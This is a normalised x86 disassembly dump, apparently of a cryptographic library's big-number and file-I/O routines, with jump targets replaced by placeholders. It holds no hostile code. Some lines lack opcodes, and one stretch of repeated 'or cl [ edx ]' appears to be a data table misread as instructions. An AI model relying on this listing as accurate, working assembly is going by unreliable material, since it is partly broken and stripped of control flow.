jne r-xdata
push edi
push esi
call sub_10029a00
add esp 0x8
mov [ esp + 0x20 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp esi ebx
jne r-xdata
mov [ esi + 0x4 ] edi
lea eax [ edi * 4 ]
lea edi [ ecx + 0x1 ]
mov ecx [ esp + 0x18 ]
mov [ esi + 0xc ] 0x0
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
dec edi
jne r-xdata
mov edx [ esi ]
sub eax 0x4
mov ebp 0x3
mov [ eax + edx ] ebx
xor ebx ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x8 ] edi
push ecx
call sub_1001d740
mov eax [ esp + 0x24 ]
add esp 0x4
xor edx edx
mov dl [ ecx ]
shl ebx 0x8
or ebx edx
inc ecx
mov edx ebp
dec ebp
test edx edx
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
test [ eax + 0x10 ] 0x1
je r-xdata
test [ eax + 0x10 ] 0x2
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ eax ] 0x0
or ch 0x80
mov [ eax + 0x10 ] ecx
push eax
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ecx
call sub_1001d740
mov eax [ esp + 0x14 ]
add esp 0x4
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
sub_10029ef0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov eax [ ebx + 0x4 ]
test eax eax
lea ecx [ eax - 0x1 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + ecx * 4 ]
test eax 0xffff0000
je r-xdata
xor ecx ecx
jmp r-xdata
test ah 0xff
je r-xdata
test eax 0xff000000
je r-xdata
lea eax [ ecx + 0x7 ]
cdq
and edx 0x7
add eax edx
mov esi eax
sar esi 0x3
mov ebp esi
mov ecx esi
dec esi
test ecx ecx
je r-xdata
movsx eax [ eax + r--data ]
shr eax 0x8
movsx eax [ eax + r--data ]
add eax 0x8
jmp r-xdata
shr eax 0x10
movsx eax [ eax + r--data ]
add eax 0x10
jmp r-xdata
shr eax 0x18
movsx eax [ eax + r--data ]
add eax 0x18
jmp r-xdata
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
shl ecx 0x5
add ecx eax
mov eax [ edx + eax * 4 ]
shl ecx 0x3
shr eax cl
inc edi
mov ecx esi
dec esi
test ecx ecx
mov [ edi - 0x1 ] al
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax esi
mov ecx esi
cdq
and edx 0x3
add eax edx
mov edx [ ebx ]
sar eax 0x2
and ecx 0x80000003
jns r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
sub_10029fb0
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov ecx [ edx + 0x4 ]
mov edi [ esi + 0x4 ]
mov eax ecx
sub eax edi
jne r-xdata
pop edi
pop esi
retn
mov edi [ edx ]
mov edx [ esi ]
lea eax [ ecx - 0x1 ]
test eax eax
jl r-xdata
xor eax eax
lea ecx [ edx + eax * 4 ]
sub edi edx
sbb eax eax
pop edi
and eax 0x2
pop esi
dec eax
retn
dec eax
sub ecx 0x4
test eax eax
jge r-xdata
mov edx [ edi + ecx ]
mov esi [ ecx ]
cmp esi edx
jne r-xdata
sub_1002a000
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
xor eax eax
test ecx ecx
setne al
mov esi [ esp + 0x18 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax [ edi + 0xc ]
mov ecx [ esi + 0xc ]
cmp eax ecx
je r-xdata
test eax eax
jne r-xdata
neg eax
sbb eax eax
pop edi
and al 0xfe
pop esi
pop ebp
inc eax
pop ebx
retn
or eax 0xffffffff
mov ebp 0x1
mov eax 0x1
or ebp 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
jge r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x4 ]
cmp ecx edx
jg r-xdata
lea edx [ ecx - 0x1 ]
test edx edx
jl r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ esi ]
mov ebx [ edi ]
sub ebx esi
lea ecx [ esi + edx * 4 ]
jb r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
mov esi [ ebx + ecx ]
mov edi [ ecx ]
cmp esi edi
ja r-xdata
sub_1002a0a0
mov ecx [ esp + 0x8 ]
push ebx
push ebp
push esi
test ecx ecx
push edi
jge r-xdata
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov ebx eax
sar ebx 0x5
and ecx 0x8000001f
jns r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov esi [ esp + 0x14 ]
mov [ esp + 0x18 ] ecx
cmp [ esi + 0x4 ] ebx
jg r-xdata
dec ecx
or ecx 0xffffffe0
inc ecx
mov eax [ esi ]
mov edx 0x1
shl edx cl
mov ecx [ eax + ebx * 4 ]
lea eax [ eax + ebx * 4 ]
pop edi
pop esi
pop ebp
pop ebx
or ecx edx
mov [ eax ] ecx
mov eax 0x1
retn
mov eax [ esi + 0x8 ]
lea edi [ ebx + 0x1 ]
cmp edi eax
jle r-xdata
test esi esi
jne r-xdata
push edi
push esi
call sub_10029a00
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
jge r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] edi
mov edx [ esi ]
inc eax
cmp eax edi
mov [ edx + eax * 4 - 0x4 ] 0x0
jl r-xdata
mov ecx [ esp + 0x18 ]
mov [ esi ] ebp
mov [ esi + 0x8 ] edi
push eax
call sub_1001d740
add esp 0x4
sub_1002a150
mov ecx [ esp + 0x8 ]
test ecx ecx
jge r-xdata
mov eax ecx
push esi
cdq
and edx 0x1f
add eax edx
mov edx [ esp + 0x8 ]
sar eax 0x5
mov esi [ edx + 0x4 ]
cmp esi eax
pop esi
jg r-xdata
xor eax eax
retn
mov edx [ edx ]
and ecx 0x8000001f
jns r-xdata
xor eax eax
retn
mov eax [ edx + eax * 4 ]
shr eax cl
and eax 0x1
retn
dec ecx
or ecx 0xffffffe0
inc ecx
sub_1002a1c0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ edx + eax * 4 - 0x4 ]
mov ecx [ edi + eax * 4 - 0x4 ]
cmp esi ecx
je r-xdata
lea ecx [ eax - 0x2 ]
test ecx ecx
jl r-xdata
sbb eax eax
pop edi
and eax 0x2
pop esi
dec eax
retn
pop edi
xor eax eax
pop esi
retn
lea eax [ edx + ecx * 4 ]
sub edi edx
dec ecx
sub eax 0x4
test ecx ecx
jge r-xdata
mov edx [ edi + eax ]
mov esi [ eax ]
cmp esi edx
jne r-xdata
sub_1002a210
mov eax [ esp + 0x10 ]
push ebx
mov ebx [ esp + 0xc ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
test eax eax
push edi
lea esi [ ebp - 0x1 ]
jge r-xdata
mov edi [ esp + 0x14 ]
test eax eax
jle r-xdata
mov edx esi
mov ecx eax
sub edx eax
lea edx [ ebx + edx * 4 ]
mov eax [ edi + ebp * 4 - 0x4 ]
mov ecx [ ebx + ebp * 4 - 0x4 ]
cmp ecx eax
je r-xdata
add esi eax
lea ecx [ edi + esi * 4 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
inc ecx
sub edx 0x4
test ecx ecx
jl r-xdata
lea ecx [ ebp - 0x2 ]
test ecx ecx
jl r-xdata
sbb eax eax
pop edi
and eax 0x2
pop esi
pop ebp
dec eax
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
dec eax
sub ecx 0x4
test eax eax
jg r-xdata
cmp [ edx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea eax [ ebx + ecx * 4 ]
sub edi ebx
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
dec ecx
sub eax 0x4
test ecx ecx
jge r-xdata
mov edx [ edi + eax ]
mov esi [ eax ]
cmp esi edx
jne r-xdata
sub_1002a2b0
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
test edi edi
jne r-xdata
mov ebx [ esp + 0x10 ]
push 0x0
push edi
call ebx
push 0x4b
add eax 0xa
push r--data
push eax
call sub_1001d4c0
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] esi
push eax
push edi
call ebx
lea ecx [ esp + 0x18 ]
push eax
push ecx
push 0x0
mov [ esp + 0x24 ] esi
call [ esp + 0x28 ]
push esi
mov edi eax
call sub_1001d740
add esp 0x18
mov eax edi
pop edi
pop esi
pop ebx
retn
push 0x4d
push r--data
push 0x41
push 0x6f
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1002a330
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push esi
test eax eax
mov [ esp + 0x4 ] 0x0
jne r-xdata
mov esi [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
push esi
push ecx
push eax
call sub_100325c0
mov ecx [ esp + 0x10 ]
add esp 0xc
test ecx ecx
jne r-xdata
pop esi
pop ecx
retn
push esi
lea edx [ esp + 0x14 ]
push eax
push edx
push 0x0
mov [ esp + 0x20 ] ecx
call sub_10030ec0
mov esi eax
mov eax [ esp + 0x14 ]
push eax
call sub_1001d740
add esp 0x14
mov eax esi
pop esi
pop ecx
retn
push 0x68
push r--data
push 0x41
push 0xbf
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ecx
retn
sub_1002a3b0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
call sub_100244f0
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x2
retn
mov eax 0x1
retn
push esi
mov esi [ esp + 0xc ]
mov edx [ esi ]
push edx
call sub_10024660
add esp 0x4
mov [ esi ] 0x0
mov eax 0x2
pop esi
retn
sub_1002a440
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
push ebx
call fopen
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
push rw-data
call sub_100207d0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push 0x7e
push r--data
call [ GetLastError@IAT ]
push eax
push 0x1
push 0x2
call sub_1001de60
push r--data
push esi
push r--data
push ebx
push r--data
push 0x5
call sub_1001e1a0
add esp 0x2c
call _errno
cmp [ eax ] 0x2
jne r-xdata
push 0x0
push esi
call sub_10020900
push edi
push 0x1
push 0x6a
push esi
call sub_10020c60
add esp 0x18
mov eax esi
pop edi
pop esi
pop ebx
retn
push edi
call fclose
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x83
push r--data
push 0x2
push 0x6d
push 0x20
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push 0x81
push r--data
push 0x80
push 0x6d
push 0x20
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1002a530
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push eax
call fclose
add esp 0x4
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x14 ] 0x0
sub_1002a580
push esi
mov esi [ esp + 0x8 ]
xor eax eax
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
pop esi
retn
mov ecx [ esp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ esp + 0x10 ]
push eax
push edx
push 0x1
push ecx
call fread
mov ecx [ esi + 0x20 ]
add esp 0x10
test [ ecx + 0xc ] 0x20
je r-xdata
push 0xca
push r--data
call [ GetLastError@IAT ]
push eax
push 0xb
push 0x2
call sub_1001de60
push 0xcb
push r--data
push 0x2
push 0x82
push 0x20
call sub_1001de60
add esp 0x28
or eax 0xffffffff
sub_1002a5f0
mov edx [ esp + 0x4 ]
xor eax eax
push esi
mov ecx [ edx + 0xc ]
test ecx ecx
je r-xdata
pop esi
retn
mov ecx [ esp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ edx + 0x20 ]
mov esi [ esp + 0x10 ]
push eax
push 0x1
push esi
push ecx
call fwrite
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub_1002a630
mov eax 0x4
call sub_1001d0d0
mov ecx [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov eax [ ebp + 0x20 ]
dec ecx
mov edi 0x1
cmp ecx 0x84
mov [ esp + 0x10 ] edi
ja r-xdata
mov [ esp + 0x10 ] 0x0
xor edx edx
mov dl [ ecx + lookup_table_1002a928 ]
jmp [ edx * 4 + jump_table_1002a8fc ]
mov ecx [ esp + 0x20 ]
push 0x0
push ecx
push eax
call fseek
add esp 0xc
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ eax + 0xc ]
pop edi
and eax 0x10
pop esi
pop ebp
mov [ esp + 0x4 ] eax
pop ebx
pop ecx
retn
push eax
call ftell
add esp 0x4
mov [ esp + 0x10 ] eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor esi esi
cmp ebp esi
je r-xdata
xor esi esi
cmp ebp esi
je r-xdata
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ esp + 0x4 ] edx
mov eax edx
pop ebx
pop ecx
retn
mov eax [ esp + 0x20 ]
pop edi
mov [ ebp + 0x10 ] eax
mov eax [ esp + 0xc ]
pop esi
pop ebp
pop ebx
pop ecx
retn
push eax
call fflush
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ esp + 0x10 ] edi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov edx eax
mov [ ebp + 0x20 ] ecx
and edx edi
mov [ ebp + 0xc ] edi
mov [ ebp + 0x10 ] edx
mov ecx [ ecx + 0x10 ]
test al 0x10
je r-xdata
cmp [ ebp + 0x10 ] esi
je r-xdata
mov ebx [ esp + 0x20 ]
mov eax ebx
and eax edi
test bl 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
mov [ ecx ] eax
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn
push 0x8000
push ecx
call _setmode
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x4000
push ecx
call _setmode
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp [ ebp + 0xc ] esi
je r-xdata
mov eax ebx
and eax 0x2
je r-xdata
test bl 0x2
push 0x4
je r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
mov [ ebp + 0xc ] esi
cmp eax esi
je r-xdata
test bl 0x4
je r-xdata
test bl 0x4
je r-xdata
push r--data
jmp r-xdata
lea ecx [ esp + 0x1c ]
push r--data
push ecx
jmp r-xdata
mov [ ebp + 0xc ] esi
cmp eax esi
je r-xdata
push eax
call fclose
add esp 0x4
mov [ ebp + 0x20 ] esi
mov [ ebp + 0x14 ] esi
cmp eax esi
je r-xdata
push 0x4
lea ecx [ esp + 0x1c ]
push r--data
push ecx
jmp r-xdata
push 0x4
lea eax [ esp + 0x1c ]
push r--data
push eax
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
call sub_100267d0
add esp 0xc
lea edx [ esp + 0x18 ]
test bl 0x10
mov edi r--data
je r-xdata
push eax
call fclose
add esp 0x4
mov [ ebp + 0x20 ] esi
mov [ ebp + 0x14 ] esi
push 0x151
push r--data
push 0x65
push 0x74
push 0x20
call sub_1001de60
add esp 0x14
mov [ esp + 0x10 ] esi
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x4
push r--data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ esp + 0x28 ]
push esi
call fopen
add esp 0x8
test eax eax
jne r-xdata
mov edi r--data
push 0x0
push ebp
mov [ ebp + 0x20 ] eax
mov [ ebp + 0xc ] 0x1
call sub_10020900
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push 0x164
push r--data
call [ GetLastError@IAT ]
push eax
push 0x1
push 0x2
call sub_1001de60
lea ecx [ esp + 0x2c ]
push r--data
push ecx
push r--data
push esi
push r--data
push 0x5
call sub_1001e1a0
push 0x166
push r--data
push 0x2
push 0x74
push 0x20
call sub_1001de60
add esp 0x40
sub_1002a933
push es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ edi ]
or [ ecx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or al [ eax ]
or cl [ edx ]
or cl [ edx ]
add dl [ eax + 0x448b9090 ]
and al 0x4
mov edx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
xor esi esi
mov [ edi ] 0x0
mov ecx [ eax + 0x20 ]
push ecx
push edx
push edi
call fgets
mov al [ edi ]
add esp 0xc
test al al
je r-xdata
mov eax esi
pop edi
pop esi
retn
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
pop edi
mov eax ecx
pop esi
retn
sub_1002a9f0
mov edx [ esp + 0x8 ]
push esi
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx [ esp + 0xc ]
mov edi [ ecx + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
retn
test edx edx
je r-xdata
mov eax [ ecx + 0x20 ]
push eax
push 0x1
push esi
push edx
call fwrite
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub_1002aa50
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
mov ecx [ esi + 0x8 ]
and ecx 0xfffffffd
mov [ esi + 0x8 ] ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ebx [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
test edi edi
je r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
push 0xfc
push r--data
push 0x8b
test ebx ebx
je r-xdata
push ecx
call sub_10022640
add esp 0x4
mov eax [ esi ]
push esi
call [ eax + 0x10 ]
add esp 0x4
pop edi
pop esi
pop ebx
retn
mov edx [ edi ]
mov ebx [ eax ]
cmp edx ebx
je r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
push eax
call sub_1004bec0
add esp 0x4
mov ebx eax
push ebx
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
mov [ esi ] edi
mov edi [ edi + 0x44 ]
test edi edi
je r-xdata
mov ecx [ eax + 0x44 ]
test ecx ecx
je r-xdata
mov [ esi + 0x4 ] 0x0
jmp r-xdata
mov ecx [ edi ]
push ecx
push ebx
call sub_1004bee0
add esp 0x8
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
push 0xde
push r--data
push 0x86
jmp r-xdata
push 0x12e
push r--data
push edi
call sub_1001d4c0
add esp 0xc
mov [ esi + 0xc ] eax
mov edx [ esi + 0xc ]
push edx
call sub_1001d740
add esp 0x4
mov edi eax
mov [ esi + 0x4 ] ebx
push 0xec
push r--data
push 0x86
jmp r-xdata
push 0x8b
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1002aba0
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x40
jle r-xdata
mov edx [ esp + 0x14 ]
mov ecx [ esi ]
push edx
push esi
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ esp + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
push r--data
push 0x150
push r--data
call sub_1001f8d0
mov eax [ esi ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov ecx [ esi ]
mov edi [ esi + 0xc ]
xor eax eax
mov ecx [ ecx + 0x44 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
push esi
call eax
mov eax [ esi + 0x8 ]
add esp 0x4
or al 0x2
mov [ esi + 0x8 ] eax
sub_1002ac20
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
push ebp
je r-xdata
push 0x168
push r--data
push 0x6f
push 0x6e
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop ebp
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov ebp [ esp + 0xc ]
mov ecx [ ebx ]
push esi
mov eax [ ebp ]
cmp eax ecx
jne r-xdata
push eax
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
or ecx 0x4
mov [ ebp + 0x8 ] ecx
jmp r-xdata
push 0x16f
push r--data
push 0x26
push 0x6e
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop ebp
pop ebx
retn
mov eax [ ebp ]
test eax eax
je r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x2
jne r-xdata
mov edx ebp
xor ecx ecx
mov eax ebx
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov edx [ eax ]
mov ecx ebp
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov [ ecx + 0xc ] eax
mov ecx [ ebp ]
mov eax [ ecx + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10022640
add esp 0x4
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
push ebp
call eax
add esp 0x4
mov ecx [ ebp ]
pop esi
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
test esi esi
je r-xdata
test [ ebp + 0x8 ] 0x4
jne r-xdata
pop ebp
mov eax 0x1
pop ebx
retn
push ebx
push ebp
call eax
add esp 0x8
pop ebp
pop ebx
retn
push 0x180
push r--data
push eax
call sub_1001d4c0
add esp 0xc
mov [ ebp + 0xc ] eax
mov [ ebp + 0xc ] esi
jmp r-xdata
push eax
push ecx
call sub_10026870
mov eax [ ebp + 0xc ]
push eax
call sub_1001d740
add esp 0xc
mov edx [ ebp ]
mov esi [ ebx + 0xc ]
push edi
mov edi [ ebp + 0xc ]
mov ecx [ edx + 0x44 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
sub_1002ad90
mov eax 0x10
call sub_1001d0d0
xor ecx ecx
push esi
mov esi [ esp + 0x28 ]
mov eax ecx
and al 0xfd
mov edx ecx
or al 0x1
push edi
test ecx ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x8 ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
je r-xdata
mov edi [ esp + 0x30 ]
test esi esi
je r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test esi esi
je r-xdata
cmp edx esi
je r-xdata
push 0xfc
push r--data
push 0x8b
jmp r-xdata
test edi edi
je r-xdata
push ecx
call sub_10022640
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
call [ edx + 0x10 ]
add esp 0x4
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ edx ]
cmp eax edi
je r-xdata
test edx edx
je r-xdata
push 0x8b
push 0x6
call sub_1001de60
add esp 0x14
mov ecx [ esi ]
push ecx
call sub_1004bec0
add esp 0x4
mov edi eax
push edi
call sub_100225b0
add esp 0x4
test eax eax
jne r-xdata
xor esi esi
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0xc ]
lea eax [ esp + 0xc ]
push edx
push eax
call [ ecx + 0x14 ]
add esp 0xc
test eax eax
je r-xdata
mov edx esi
mov [ esp + 0x8 ] edx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax [ edx + 0x44 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax + 0x20 ]
test ecx ecx
je r-xdata
mov [ esp + 0xc ] 0x0
jmp r-xdata
mov edx [ esi ]
push edx
push edi
call sub_1004bee0
add esp 0x8
test eax eax
jne r-xdata
test edi edi
je r-xdata
push 0xde
mov edx [ esp + 0x8 ]
cmp [ edx + 0x8 ] 0x40
jle r-xdata
push 0x12e
push r--data
push eax
call sub_1001d4c0
mov edx [ esp + 0x14 ]
add esp 0xc
mov [ esp + 0x14 ] eax
push ecx
call sub_1001d740
add esp 0x4
mov eax esi
pop edi
pop esi
add esp 0x10
retn
push eax
call sub_10022640
add esp 0x4
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x2
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x8 ]
mov esi eax
mov [ esp + 0xc ] edi
push 0xec
jmp r-xdata
mov eax [ esp + 0x24 ]
mov edx [ esp + 0x8 ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
call [ edx + 0x18 ]
mov ecx [ esp + 0x10 ]
mov esi eax
mov eax [ esp + 0x30 ]
add esp 0x8
test eax eax
je r-xdata
push r--data
push 0x150
push r--data
call sub_1001f8d0
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
push eax
call ecx
mov eax [ esp + 0xc ]
add esp 0x4
push r--data
push 0x86
mov eax [ ecx + 0x20 ]
test eax eax
je r-xdata
mov edx [ ecx + 0x8 ]
mov [ eax ] edx
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x44 ]
mov edi [ esp + 0x14 ]
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
test esi esi
[ edi ]
je r-xdata
lea ecx [ esp + 0x8 ]
push ecx
call eax
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0xc ]
add esp 0x4
or al 0x2
mov [ esp + 0x10 ] eax
test [ esp + 0x10 ] 0x4
jne r-xdata
mov esi 0x1
jmp r-xdata
push eax
push ecx
call sub_10026870
mov ecx [ esp + 0x1c ]
push ecx
